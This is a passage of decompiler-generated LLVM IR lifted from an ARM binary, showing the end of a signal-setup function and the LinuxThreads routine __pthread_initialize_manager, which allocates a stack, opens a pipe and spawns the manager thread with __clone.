  store i32 %v2_1fc64, i32* %stack_var_-60, align 4
  %v2_1fc70 = call i32 @__GI_sigaddset(i32 %v2_1fc68, i32 %v2_1fc60)
  store i32 252, i32* %r3.global-to-local, align 4
  %v0_1fc78 = load i32, i32* @r6, align 4
  %v2_1fc78 = add i32 %v0_1fc78, 252
  %v3_1fc78 = inttoptr i32 %v2_1fc78 to i32*
  %v4_1fc78 = load i32, i32* %v3_1fc78, align 4
  store i32 %v4_1fc78, i32* @r8, align 4
  store i32 %v2_1fc24, i32* @r1, align 4
  %v1_1fc80 = inttoptr i32 %v4_1fc78 to i32*
  %v2_1fc80 = load i32, i32* %v1_1fc80, align 4
  %v0_1fc84 = load i32, i32* @r5, align 4
  store i32 %v0_1fc84, i32* @r2, align 4
  %v3_1fc88 = call i32 @__libc_sigaction(i32 %v2_1fc80)
  store i32 72, i32* %r3.global-to-local, align 4
  %v0_1fc90 = load i32, i32* @r6, align 4
  %v2_1fc90 = add i32 %v0_1fc90, 72
  %v3_1fc90 = inttoptr i32 %v2_1fc90 to i32*
  %v4_1fc90 = load i32, i32* %v3_1fc90, align 4
  store i32 %v4_1fc90, i32* %r3.global-to-local, align 4
  %v1_1fc94 = inttoptr i32 %v4_1fc90 to i32*
  %v2_1fc94 = load i32, i32* %v1_1fc94, align 4
  %tmp23 = icmp slt i32 %v2_1fc94, 1
  br i1 %tmp23, label %dec_label_pc_1fcc0, label %dec_label_pc_1fca0

dec_label_pc_1fca0:                               ; preds = %.thread7
  store i32 %v2_1fc24, i32* @r1, align 4
  %v2_1fca8 = add i32 %v0_1fc90, -152216
  store i32 %v2_1fca8, i32* %r3.global-to-local, align 4
  %v0_1fcac = load i32, i32* @r5, align 4
  store i32 %v0_1fcac, i32* @r2, align 4
  store i32 %v2_1fca8, i32* %stack_var_-60, align 4
  store i32 %v0_1fcac, i32* %stack_var_-48, align 4
  %v3_1fcbc = call i32 @__libc_sigaction(i32 %v2_1fc94)
  br label %dec_label_pc_1fcc0

dec_label_pc_1fcc0:                               ; preds = %.thread7, %dec_label_pc_1fca0
  %v2_1fcc0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1fcc0, i32* @r4, align 4
  %v0_1fcc4 = load i32, i32* @r7, align 4
  %v1_1fcc4 = inttoptr i32 %v0_1fcc4 to i32*
  %v2_1fcc4 = load i32, i32* %v1_1fcc4, align 4
  store i32 %v2_1fcc0, i32* @r0, align 4
  %v0_1fccc = load i32, i32* @r5, align 4
  store i32 %v0_1fccc, i32* %stack_var_-32, align 4
  %v2_1fcd4 = call i32 @__GI_sigaddset(i32 %v2_1fcc0, i32 %v2_1fcc4)
  %v0_1fcd8 = load i32, i32* @r5, align 4
  store i32 %v0_1fcd8, i32* %r2.global-to-local, align 4
  %v3_1fce4 = call i32 @__GI_sigprocmask(i32 %v0_1fcd8, i32 %v2_1fcc0, i32 %v0_1fcd8)
  store i32 %v2_1fcc0, i32* @r0, align 4
  %v1_1fcf0 = call i32 @__GI_sigdelset(i32 %v2_1fcc0)
  %v0_1fcf4 = load i32, i32* @r8, align 4
  %v1_1fcf4 = inttoptr i32 %v0_1fcf4 to i32*
  %v2_1fcf4 = load i32, i32* %v1_1fcf4, align 4
  store i32 %v2_1fcc0, i32* @r0, align 4
  %v2_1fcfc = call i32 @__GI_sigaddset(i32 %v2_1fcc0, i32 %v2_1fcf4)
  %v0_1fd08 = load i32, i32* @r5, align 4
  store i32 %v0_1fd08, i32* %r2.global-to-local, align 4
  %v3_1fd0c = call i32 @__GI_sigprocmask(i32 1, i32 %v2_1fcc0, i32 %v0_1fd08)
  %v0_1fd14 = load i32, i32* @r5, align 4
  %v0_1fd18 = load i32, i32* @r6, align 4
  %v2_1fd18 = add i32 %v0_1fd18, -151676
  %v2_1fd1c = call i32 @on_exit(i32 %v2_1fd18, i32 %v0_1fd14)
  %v2_1fd24.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1fd20

dec_label_pc_1fd20:                               ; preds = %entry, %dec_label_pc_1fcc0
  %v2_1fd24 = phi i32 [ %v2_1fd24.pre, %dec_label_pc_1fcc0 ], [ %v3_1fb5c, %entry ]
  %.0 = phi i32 [ %v2_1fd1c, %dec_label_pc_1fcc0 ], [ undef, %entry ]
  store i32 %v2_1fd24, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_1fcc0, { 0, 2, 1, 4, 3, 5, 7, 6, 8 }
  uselistorder i1 %tmp24, { 1, 0 }
  uselistorder i32 %v1_1fc0c, { 2, 0, 1 }
  uselistorder i32 %v3_1fbe4, { 1, 2, 0 }
  uselistorder i32 %v0_1fb98, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_1fb84, { 1, 0 }
  uselistorder i32 (i32)* @__GI_sigdelset, { 1, 0, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0, 3, 4 }
  uselistorder i32 (i32)* @__libc_sigaction, { 3, 2, 1, 5, 4, 0 }
  uselistorder label %dec_label_pc_1fd20, { 1, 0 }
  uselistorder label %dec_label_pc_1fcc0, { 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_1fbe8, { 1, 0 }
  uselistorder label %dec_label_pc_1fbd8, { 1, 0 }
}

define i32 @function_1fd30(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1fd30:
  %v0_1fd30 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1fd30, label %.thread1, label %.thread5

.thread1:                                         ; preds = %dec_label_pc_1fd30
  call void @llvm.trap()
  unreachable

.thread5:                                         ; preds = %dec_label_pc_1fd30
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_manager() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_1fd64 = load i32, i32* @r5, align 4
  %v9_1fd64 = load i32, i32* @r6, align 4
  %v12_1fd64 = load i32, i32* @r7, align 4
  %v15_1fd64 = load i32, i32* @lr, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  %v4_1fd74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 64) to i32*), align 4
  store i32 %v4_1fd74, i32* %r3.global-to-local, align 4
  %v1_1fd78 = inttoptr i32 %v4_1fd74 to i32*
  %v2_1fd78 = load i32, i32* %v1_1fd78, align 4
  store i32 %v2_1fd78, i32* %r2.global-to-local, align 4
  store i32 38684, i32* %r3.global-to-local, align 4
  %v4_1fd80 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38684) to i32*), align 4
  store i32 %v4_1fd80, i32* %r1.global-to-local, align 4
  %v2_1fd84 = icmp eq i32 %v2_1fd78, 0
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_1fd90 = inttoptr i32 %v4_1fd80 to i32*
  store i32 1, i32* %v2_1fd90, align 4
  store i32 130456, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1fd84, i32 ptrtoint (i32* @global_var_1fb5c.1395 to i32))
  store i32 220, i32* %r3.global-to-local, align 4
  %v0_1fd9c = load i32, i32* @r6, align 4
  %v2_1fd9c = add i32 %v0_1fd9c, 220
  %v3_1fd9c = inttoptr i32 %v2_1fd9c to i32*
  %v4_1fd9c = load i32, i32* %v3_1fd9c, align 4
  store i32 %v4_1fd9c, i32* @r4, align 4
  %v1_1fda0 = inttoptr i32 %v4_1fd9c to i32*
  %v2_1fda0 = load i32, i32* %v1_1fda0, align 4
  %v2_1fda4 = mul i32 %v2_1fda0, 2
  %v1_1fda8 = add i32 %v2_1fda4, -32
  store i32 %v1_1fda8, i32* %r0.global-to-local, align 4
  %v1_1fdac = call i32 @malloc(i32 %v1_1fda8)
  store i32 %v1_1fdac, i32* %r0.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_1fdb4 = load i32, i32* @r6, align 4
  %v2_1fdb4 = add i32 %v0_1fdb4, 44
  %v3_1fdb4 = inttoptr i32 %v2_1fdb4 to i32*
  %v4_1fdb4 = load i32, i32* %v3_1fdb4, align 4
  store i32 %v4_1fdb4, i32* @r5, align 4
  %v2_1fdb8 = icmp eq i32 %v1_1fdac, 0
  %v2_1fdbc = inttoptr i32 %v4_1fdb4 to i32*
  store i32 %v1_1fdac, i32* %v2_1fdbc, align 4
  br i1 %v2_1fdb8, label %.dec_label_pc_1ffbc_crit_edge, label %dec_label_pc_1fdc8

.dec_label_pc_1ffbc_crit_edge:                    ; preds = %entry
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ffbc

dec_label_pc_1fdc8:                               ; preds = %entry
  store i32 204, i32* %r3.global-to-local, align 4
  %v0_1fdcc = load i32, i32* @r4, align 4
  %v1_1fdcc = inttoptr i32 %v0_1fdcc to i32*
  %v2_1fdcc = load i32, i32* %v1_1fdcc, align 4
  store i32 %v2_1fdcc, i32* %r2.global-to-local, align 4
  %v0_1fdd0 = load i32, i32* @r6, align 4
  %v2_1fdd0 = add i32 %v0_1fdd0, 204
  %v3_1fdd0 = inttoptr i32 %v2_1fdd0 to i32*
  %v4_1fdd0 = load i32, i32* %v3_1fdd0, align 4
  store i32 %v4_1fdd0, i32* @r7, align 4
  %v0_1fdd4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1fdd8 = mul i32 %v2_1fdcc, 2
  %v1_1fdd4 = add i32 %v3_1fdd8, -32
  %v4_1fdd8 = add i32 %v1_1fdd4, %v0_1fdd4
  store i32 %v4_1fdd8, i32* %r3.global-to-local, align 4
  %v2_1fddc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1fddc, i32* %r0.global-to-local, align 4
  %v2_1fde0 = inttoptr i32 %v4_1fdd0 to i32*
  store i32 %v4_1fdd8, i32* %v2_1fde0, align 4
  %v1_1fde4 = call i32 @__GI_pipe(i32 %v2_1fddc)
  store i32 %v1_1fde4, i32* %r0.global-to-local, align 4
  %v3_1fde8 = icmp eq i32 %v1_1fde4, -1
  store i32 %v1_1fde4, i32* @r4, align 4
  br i1 %v3_1fde8, label %dec_label_pc_1fdf4, label %dec_label_pc_1fe04

dec_label_pc_1fdf4:                               ; preds = %dec_label_pc_1fdc8
  %v0_1fdf4 = load i32, i32* @r5, align 4
  %v1_1fdf4 = inttoptr i32 %v0_1fdf4 to i32*
  %v2_1fdf4 = load i32, i32* %v1_1fdf4, align 4
  store i32 %v2_1fdf4, i32* @r0, align 4
  %v0_1fdf8 = call i32 @free()
  %v0_1fdfc = load i32, i32* @r4, align 4
  store i32 %v0_1fdfc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ffbc

dec_label_pc_1fe04:                               ; preds = %dec_label_pc_1fdc8
  store i32 28, i32* %r3.global-to-local, align 4
  %v0_1fe08 = load i32, i32* @r6, align 4
  %v2_1fe08 = add i32 %v0_1fe08, 28
  %v3_1fe08 = inttoptr i32 %v2_1fe08 to i32*
  %v4_1fe08 = load i32, i32* %v3_1fe08, align 4
  store i32 %v4_1fe08, i32* %r3.global-to-local, align 4
  %v1_1fe0c = inttoptr i32 %v4_1fe08 to i32*
  %v2_1fe0c = load i32, i32* %v1_1fe0c, align 4
  store i32 %v2_1fe0c, i32* %r2.global-to-local, align 4
  %v2_1fe10 = icmp eq i32 %v2_1fe0c, 0
  br i1 %v2_1fe10, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_1fe04
  store i32 184, i32* %r3.global-to-local, align 4
  %v3_1fe18 = add i32 %v0_1fe08, 184
  %v4_1fe18 = inttoptr i32 %v3_1fe18 to i32*
  %v5_1fe18 = load i32, i32* %v4_1fe18, align 4
  store i32 %v5_1fe18, i32* %r3.global-to-local, align 4
  %v3_1fe1c = add i32 %v5_1fe18, 292
  %v4_1fe1c = inttoptr i32 %v3_1fe1c to i32*
  store i32 %v2_1fe0c, i32* %v4_1fe1c, align 4
  %v0_1fe24.pre = load i32, i32* @r6, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1fe04, %bb
  %v0_1fe54 = phi i32 [ %v0_1fe08, %dec_label_pc_1fe04 ], [ %v0_1fe24.pre, %bb ]
  store i32 184, i32* %r3.global-to-local, align 4
  %v2_1fe24 = add i32 %v0_1fe54, 184
  %v3_1fe24 = inttoptr i32 %v2_1fe24 to i32*
  %v4_1fe24 = load i32, i32* %v3_1fe24, align 4
  store i32 %v4_1fe24, i32* %r2.global-to-local, align 4
  %v1_1fe28 = add i32 %v4_1fe24, 292
  %v2_1fe28 = inttoptr i32 %v1_1fe28 to i32*
  %v3_1fe28 = load i32, i32* %v2_1fe28, align 4
  store i32 %v3_1fe28, i32* %r3.global-to-local, align 4
  %v2_1fe2c = icmp eq i32 %v3_1fe28, 0
  br i1 %v2_1fe2c, label %dec_label_pc_1fec0, label %dec_label_pc_1fe34

dec_label_pc_1fe34:                               ; preds = %.thread3
  store i32 168, i32* %r3.global-to-local, align 4
  %v2_1fe38 = add i32 %v0_1fe54, 168
  %v3_1fe38 = inttoptr i32 %v2_1fe38 to i32*
  %v4_1fe38 = load i32, i32* %v3_1fe38, align 4
  store i32 %v4_1fe38, i32* %r3.global-to-local, align 4
  %v1_1fe3c = add i32 %v4_1fe24, 296
  %v2_1fe3c = inttoptr i32 %v1_1fe3c to i32*
  %v3_1fe3c = load i32, i32* %v2_1fe3c, align 4
  store i32 %v3_1fe3c, i32* %r2.global-to-local, align 4
  %v1_1fe40 = inttoptr i32 %v4_1fe38 to i32*
  %v2_1fe40 = load i32, i32* %v1_1fe40, align 4
  %v2_1fe44 = or i32 %v2_1fe40, %v3_1fe3c
  store i32 %v2_1fe44, i32* %r3.global-to-local, align 4
  %v1_1fe48 = and i32 %v2_1fe44, 128
  %v2_1fe48 = icmp eq i32 %v1_1fe48, 0
  br i1 %v2_1fe48, label %dec_label_pc_1fec0, label %dec_label_pc_1fe50

dec_label_pc_1fe50:                               ; preds = %dec_label_pc_1fe34
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_1fe54 = add i32 %v0_1fe54, 120
  %v3_1fe54 = inttoptr i32 %v2_1fe54 to i32*
  %v4_1fe54 = load i32, i32* %v3_1fe54, align 4
  store i32 %v4_1fe54, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1fe5c = add i32 %v4_1fe54, 28
  %v2_1fe5c = inttoptr i32 %v1_1fe5c to i32*
  %v3_1fe5c = load i32, i32* %v2_1fe5c, align 4
  store i32 %v3_1fe5c, i32* @r0, align 4
  %v0_1fe60 = call i32 @__pthread_lock()
  store i32 %v0_1fe60, i32* %r0.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_1fe68 = load i32, i32* @r7, align 4
  %v1_1fe68 = inttoptr i32 %v0_1fe68 to i32*
  %v2_1fe68 = load i32, i32* %v1_1fe68, align 4
  store i32 %v2_1fe68, i32* %r1.global-to-local, align 4
  %v0_1fe6c = load i32, i32* @r6, align 4
  %v2_1fe6c = add i32 %v0_1fe6c, 52
  %v3_1fe6c = inttoptr i32 %v2_1fe6c to i32*
  %v4_1fe6c = load i32, i32* %v3_1fe6c, align 4
  store i32 %v4_1fe6c, i32* %r0.global-to-local, align 4
  store i32 3840, i32* %r2.global-to-local, align 4
  %v3_1fe74 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_1fe74, i32* %r3.global-to-local, align 4
  %v4_1fe78 = call i32 @__clone(i32 %v4_1fe6c, i32 %v2_1fe68, i32 3840, i32 %v3_1fe74)
  store i32 %v4_1fe78, i32* @r0, align 4
  %v7_1fe7c = icmp eq i32 %v4_1fe78, -1
  store i32 %v4_1fe78, i32* @r5, align 4
  br i1 %v7_1fe7c, label %dec_label_pc_1feb0, label %dec_label_pc_1fe88

dec_label_pc_1fe88:                               ; preds = %dec_label_pc_1fe50
  store i32 172, i32* %r3.global-to-local, align 4
  %v0_1fe8c = load i32, i32* @r6, align 4
  %v2_1fe8c = add i32 %v0_1fe8c, 172
  %v3_1fe8c = inttoptr i32 %v2_1fe8c to i32*
  %v4_1fe8c = load i32, i32* %v3_1fe8c, align 4
  store i32 %v4_1fe8c, i32* %r2.global-to-local, align 4
  %v1_1fe94 = load i32, i32* @r4, align 4
  %v2_1fe94 = add i32 %v1_1fe94, 304
  %v3_1fe94 = inttoptr i32 %v2_1fe94 to i32*
  store i32 8, i32* %v3_1fe94, align 4
  store i32 2049, i32* %r3.global-to-local, align 4
  %v0_1fe9c = load i32, i32* @r4, align 4
  %v1_1fe9c = load i32, i32* %r2.global-to-local, align 4
  %v2_1fe9c = inttoptr i32 %v1_1fe9c to i32*
  store i32 %v0_1fe9c, i32* %v2_1fe9c, align 4
  %v0_1fea0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1fea0 = load i32, i32* @r4, align 4
  %v2_1fea0 = add i32 %v1_1fea0, 16
  %v3_1fea0 = inttoptr i32 %v2_1fea0 to i32*
  store i32 %v0_1fea0, i32* %v3_1fea0, align 4
  %v0_1fea4 = load i32, i32* @r4, align 4
  %v2_1fea4 = add i32 %v0_1fea4, 308
  %v3_1fea4 = inttoptr i32 %v2_1fea4 to i32*
  store i32 %v0_1fea4, i32* %v3_1fea4, align 4
  %v1_1fea8 = load i32, i32* @r4, align 4
  %v2_1fea8 = add i32 %v1_1fea8, 20
  %v3_1fea8 = inttoptr i32 %v2_1fea8 to i32*
  store i32 %v4_1fe78, i32* %v3_1fea8, align 4
  %v0_1feac = call i32 @__linuxthreads_create_event()
  store i32 %v0_1feac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1feb0

dec_label_pc_1feb0:                               ; preds = %dec_label_pc_1fe50, %dec_label_pc_1fe88
  %v0_1feb0 = load i32, i32* @r4, align 4
  %v1_1feb0 = add i32 %v0_1feb0, 28
  %v2_1feb0 = inttoptr i32 %v1_1feb0 to i32*
  %v3_1feb0 = load i32, i32* %v2_1feb0, align 4
  store i32 %v3_1feb0, i32* %r0.global-to-local, align 4
  %v1_1feb4 = call i32 @__pthread_unlock(i32 %v3_1feb0)
  store i32 %v1_1feb4, i32* %r0.global-to-local, align 4
  %v0_1feb8 = load i32, i32* @r5, align 4
  %v2_1feb8 = icmp eq i32 %v0_1feb8, 0
  br i1 %v2_1feb8, label %dec_label_pc_1feb0.dec_label_pc_1fec0_crit_edge, label %dec_label_pc_1fee4

dec_label_pc_1feb0.dec_label_pc_1fec0_crit_edge:  ; preds = %dec_label_pc_1feb0
  %v0_1fec4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1fec0

dec_label_pc_1fec0:                               ; preds = %dec_label_pc_1feb0.dec_label_pc_1fec0_crit_edge, %dec_label_pc_1fe34, %.thread3
  %v0_1fed4 = phi i32 [ %v0_1fec4.pre, %dec_label_pc_1feb0.dec_label_pc_1fec0_crit_edge ], [ %v0_1fe54, %dec_label_pc_1fe34 ], [ %v0_1fe54, %.thread3 ]
  store i32 204, i32* %r3.global-to-local, align 4
  %v2_1fec4 = add i32 %v0_1fed4, 204
  %v3_1fec4 = inttoptr i32 %v2_1fec4 to i32*
  %v4_1fec4 = load i32, i32* %v3_1fec4, align 4
  store i32 %v4_1fec4, i32* %r3.global-to-local, align 4
  %v1_1fec8 = inttoptr i32 %v4_1fec4 to i32*
  %v2_1fec8 = load i32, i32* %v1_1fec8, align 4
  store i32 %v2_1fec8, i32* %r1.global-to-local, align 4
  store i32 212, i32* %r3.global-to-local, align 4
  store i32 3840, i32* %r2.global-to-local, align 4
  %v2_1fed4 = add i32 %v0_1fed4, 212
  %v3_1fed4 = inttoptr i32 %v2_1fed4 to i32*
  %v4_1fed4 = load i32, i32* %v3_1fed4, align 4
  store i32 %v4_1fed4, i32* %r0.global-to-local, align 4
  %v3_1fed8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_1fed8, i32* %r3.global-to-local, align 4
  %v4_1fedc = call i32 @__clone(i32 %v4_1fed4, i32 %v2_1fec8, i32 3840, i32 %v3_1fed8)
  store i32 %v4_1fedc, i32* %r0.global-to-local, align 4
  store i32 %v4_1fedc, i32* @r5, align 4
  br label %dec_label_pc_1fee4

dec_label_pc_1fee4:                               ; preds = %dec_label_pc_1feb0, %dec_label_pc_1fec0
  %v0_1fee4 = phi i32 [ %v4_1fedc, %dec_label_pc_1fec0 ], [ %v0_1feb8, %dec_label_pc_1feb0 ]
  %v3_1fee4 = icmp eq i32 %v0_1fee4, -1
  br i1 %v3_1fee4, label %dec_label_pc_1feec, label %dec_label_pc_1ff14

dec_label_pc_1feec:                               ; preds = %dec_label_pc_1fee4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_1fef0 = load i32, i32* @r6, align 4
  %v2_1fef0 = add i32 %v0_1fef0, 44
  %v3_1fef0 = inttoptr i32 %v2_1fef0 to i32*
  %v4_1fef0 = load i32, i32* %v3_1fef0, align 4
  store i32 %v4_1fef0, i32* %r3.global-to-local, align 4
  %v1_1fef4 = inttoptr i32 %v4_1fef0 to i32*
  %v2_1fef4 = load i32, i32* %v1_1fef4, align 4
  store i32 %v2_1fef4, i32* @r0, align 4
  %v0_1fef8 = call i32 @free()
  %v3_1fefc = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_1fefc, i32* %r0.global-to-local, align 4
  %v1_1ff00 = call i32 @close(i32 %v3_1fefc)
  store i32 %tmp9, i32* %r0.global-to-local, align 4
  %v1_1ff08 = call i32 @close(i32 %tmp9)
  %v0_1ff0c = load i32, i32* @r5, align 4
  store i32 %v0_1ff0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ffbc

dec_label_pc_1ff14:                               ; preds = %dec_label_pc_1fee4
  store i32 276, i32* %r3.global-to-local, align 4
  %v0_1ff18 = load i32, i32* @r6, align 4
  %v2_1ff18 = add i32 %v0_1ff18, 276
  %v3_1ff18 = inttoptr i32 %v2_1ff18 to i32*
  %v4_1ff18 = load i32, i32* %v3_1ff18, align 4
  store i32 %v4_1ff18, i32* %r3.global-to-local, align 4
  %v1_1ff1c = inttoptr i32 %v4_1ff18 to i32*
  %v2_1ff1c = load i32, i32* %v1_1ff1c, align 4
  store i32 %v2_1ff1c, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_1ff24 = add i32 %v0_1ff18, 120
  %v3_1ff24 = inttoptr i32 %v2_1ff24 to i32*
  %v4_1ff24 = load i32, i32* %v3_1ff24, align 4
  store i32 %v4_1ff24, i32* %ip.global-to-local, align 4
  store i32 132, i32* %r3.global-to-local, align 4
  %v2_1ff2c = add i32 %v0_1ff18, 132
  %v3_1ff2c = inttoptr i32 %v2_1ff2c to i32*
  %v4_1ff2c = load i32, i32* %v3_1ff2c, align 4
  store i32 %v4_1ff2c, i32* %r2.global-to-local, align 4
  store i32 180, i32* %r3.global-to-local, align 4
  %v2_1ff34 = add i32 %v0_1ff18, 180
  %v3_1ff34 = inttoptr i32 %v2_1ff34 to i32*
  %v4_1ff34 = load i32, i32* %v3_1ff34, align 4
  store i32 %v4_1ff34, i32* %r1.global-to-local, align 4
  %v2_1ff3c = inttoptr i32 %v4_1ff2c to i32*
  store i32 %tmp9, i32* %v2_1ff3c, align 4
  %v3_1ff40 = load i32, i32* %stack_var_-32, align 4
  %v1_1ff44 = load i32, i32* %r1.global-to-local, align 4
  %v2_1ff44 = inttoptr i32 %v1_1ff44 to i32*
  store i32 %v3_1ff40, i32* %v2_1ff44, align 4
  store i32 2049, i32* %r3.global-to-local, align 4
  %v0_1ff4c = load i32, i32* %r0.global-to-local, align 4
  %v2_1ff4c = icmp eq i32 %v0_1ff4c, 0
  %v0_1ff50 = load i32, i32* @r5, align 4
  %v1_1ff50 = load i32, i32* %ip.global-to-local, align 4
  %v2_1ff50 = add i32 %v1_1ff50, 20
  %v3_1ff50 = inttoptr i32 %v2_1ff50 to i32*
  store i32 %v0_1ff50, i32* %v3_1ff50, align 4
  %v0_1ff54 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ff54 = load i32, i32* %ip.global-to-local, align 4
  %v2_1ff54 = add i32 %v1_1ff54, 16
  %v3_1ff54 = inttoptr i32 %v2_1ff54 to i32*
  store i32 %v0_1ff54, i32* %v3_1ff54, align 4
  br i1 %v2_1ff4c, label %dec_label_pc_1ff7c, label %dec_label_pc_1ff5c

dec_label_pc_1ff5c:                               ; preds = %dec_label_pc_1ff14
  store i32 72, i32* %r3.global-to-local, align 4
  %v0_1ff60 = load i32, i32* @r6, align 4
  %v2_1ff60 = add i32 %v0_1ff60, 72
  %v3_1ff60 = inttoptr i32 %v2_1ff60 to i32*
  %v4_1ff60 = load i32, i32* %v3_1ff60, align 4
  store i32 %v4_1ff60, i32* %r3.global-to-local, align 4
  %v1_1ff64 = inttoptr i32 %v4_1ff60 to i32*
  %v2_1ff64 = load i32, i32* %v1_1ff64, align 4
  store i32 %v2_1ff64, i32* %r0.global-to-local, align 4
  %tmp19 = icmp slt i32 %v2_1ff64, 1
  br i1 %tmp19, label %dec_label_pc_1ff7c, label %dec_label_pc_1ff70

dec_label_pc_1ff70:                               ; preds = %dec_label_pc_1ff5c
  %v1_1ff70 = call i32 @__GI_raise(i32 %v2_1ff64)
  store i32 %v1_1ff70, i32* %r0.global-to-local, align 4
  %v0_1ff74 = call i32 @_thread_self.3()
  store i32 %v0_1ff74, i32* @r0, align 4
  %v0_1ff78 = call i32 @__pthread_wait_for_restart_signal()
  store i32 %v0_1ff78, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ff7c

dec_label_pc_1ff7c:                               ; preds = %dec_label_pc_1ff5c, %dec_label_pc_1ff14, %dec_label_pc_1ff70
  store i32 132, i32* %r3.global-to-local, align 4
  %v0_1ff88 = load i32, i32* @r6, align 4
  %v2_1ff88 = add i32 %v0_1ff88, 132
  %v3_1ff88 = inttoptr i32 %v2_1ff88 to i32*
  %v4_1ff88 = load i32, i32* %v3_1ff88, align 4
  store i32 %v4_1ff88, i32* @r5, align 4
  %v2_1ff8c = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_1ff8c, i32* @r4, align 4
  br label %dec_label_pc_1ff90

dec_label_pc_1ff90:                               ; preds = %dec_label_pc_1ffa8.dec_label_pc_1ff90_crit_edge, %dec_label_pc_1ff7c
  %v0_1ff98 = phi i32 [ %v0_1ff98.pre, %dec_label_pc_1ffa8.dec_label_pc_1ff90_crit_edge ], [ %v4_1ff88, %dec_label_pc_1ff7c ]
  store i32 %v2_1ff8c, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v1_1ff98 = inttoptr i32 %v0_1ff98 to i32*
  %v2_1ff98 = load i32, i32* %v1_1ff98, align 4
  store i32 %v2_1ff98, i32* %r0.global-to-local, align 4
  %v3_1ff9c = call i32 @write(i32 %v2_1ff98, i32 %v2_1ff8c, i32 28)
  store i32 %v3_1ff9c, i32* %r0.global-to-local, align 4
  %v3_1ffa0 = icmp eq i32 %v3_1ff9c, -1
  br i1 %v3_1ffa0, label %dec_label_pc_1ffa8, label %dec_label_pc_1ffb8

dec_label_pc_1ffa8:                               ; preds = %dec_label_pc_1ff90
  %v0_1ffa8 = call i32 @__errno_location()
  store i32 %v0_1ffa8, i32* %r0.global-to-local, align 4
  %v1_1ffac = inttoptr i32 %v0_1ffa8 to i32*
  %v2_1ffac = load i32, i32* %v1_1ffac, align 4
  store i32 %v2_1ffac, i32* %r3.global-to-local, align 4
  %v7_1ffb0 = icmp eq i32 %v2_1ffac, 4
  br i1 %v7_1ffb0, label %dec_label_pc_1ffa8.dec_label_pc_1ff90_crit_edge, label %dec_label_pc_1ffb8

dec_label_pc_1ffa8.dec_label_pc_1ff90_crit_edge:  ; preds = %dec_label_pc_1ffa8
  %v0_1ff98.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ff90

dec_label_pc_1ffb8:                               ; preds = %dec_label_pc_1ff90, %dec_label_pc_1ffa8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ffbc

dec_label_pc_1ffbc:                               ; preds = %.dec_label_pc_1ffbc_crit_edge, %dec_label_pc_1feec, %dec_label_pc_1fdf4, %dec_label_pc_1ffb8
  %v1_1ffc4 = phi i32 [ -1, %.dec_label_pc_1ffbc_crit_edge ], [ %v0_1ff0c, %dec_label_pc_1feec ], [ %v0_1fdfc, %dec_label_pc_1fdf4 ], [ 0, %dec_label_pc_1ffb8 ]
  store i32 %v6_1fd64, i32* @r5, align 4
  store i32 %v9_1fd64, i32* @r6, align 4
  store i32 %v12_1fd64, i32* @r7, align 4
  store i32 %v15_1fd64, i32* @lr, align 4
  ret i32 %v1_1ffc4

; uselistorder directives
  uselistorder i32 %v0_1ff18, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1fea4, { 1, 0 }
  uselistorder i32 %v4_1fe78, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1fe08, { 1, 0, 2 }
  uselistorder i32 %tmp9, { 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 4, 8, 5, 6, 7, 10, 9, 11, 13, 12, 15, 14, 16, 17, 18, 19, 22, 20, 24, 21, 25, 23 }
